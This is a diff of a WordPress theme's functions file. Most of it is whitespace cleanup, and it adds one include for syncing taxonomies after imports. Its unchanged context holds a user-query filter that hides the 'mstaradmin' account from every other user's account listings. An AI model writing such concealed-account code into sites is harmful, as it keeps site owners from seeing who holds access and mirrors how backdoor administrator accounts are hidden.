@@ -1,4 +1,4 @@
-<?php 
+<?php
 defined('ABSPATH') OR exit;
 define('THEME_VERSION', '1.0.3');
 /**
@@ -22,7 +22,7 @@ register_sidebar(array(
   'id' => 'right-sidebar',
   'description' => 'Widgets in this area will be shown on the right-hand side.',
   'before_widget' => '<div id="%1$s">',
-  'after_widget'  => '</div>',  
+  'after_widget'  => '</div>',
   'before_title' => '<h3>',
   'after_title' => '</h3>'
 ));
@@ -59,8 +59,8 @@ add_action('pre_user_query','mstar_pre_user_query');
 function mstar_pre_user_query($user_search) {
 	global $current_user;
 	$username = $current_user->user_login;
-	
-	if ($username != 'mstaradmin') { 
+
+	if ($username != 'mstaradmin') {
 		global $wpdb;
 		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'mstaradmin'",$user_search->query_where);
 	}
@@ -104,7 +104,7 @@ function mstar_jquery_enqueue() {
         array('jquery'),
         '6.8.4',
         true
-    );	
+    );
 }
 
 add_action( 'enqueue_block_assets', 'mstar_block_admin_editor_styles' );
@@ -116,10 +116,6 @@ function mytheme_customize_register( $wp_customize ){
 	require_once( get_stylesheet_directory() . '/includes/customizer.php' );
 }
 add_action( 'customize_register', 'mytheme_customize_register' );
-
-
-
-
 
 include('includes/custom_login_functions.php');
 include('includes/general_functions.php');
@@ -136,6 +132,9 @@ include('includes/block-editor.php');
 //include('includes/twitter_loader.php'); 	//-- call within page, not functions!
 //include('includes/facebook_feed.php');  	//-- call within page, not functions!
 //include('includes/fancy_loader.php');   	//-- call within page, not functions!
+
+// Action hook that handles the taxonomy resync after wp all import class imports.
+require_once 'includes/sync_taxonomies_after_class_import.php';
 
 /**
  * Helper function to replace the first occurence of a string.
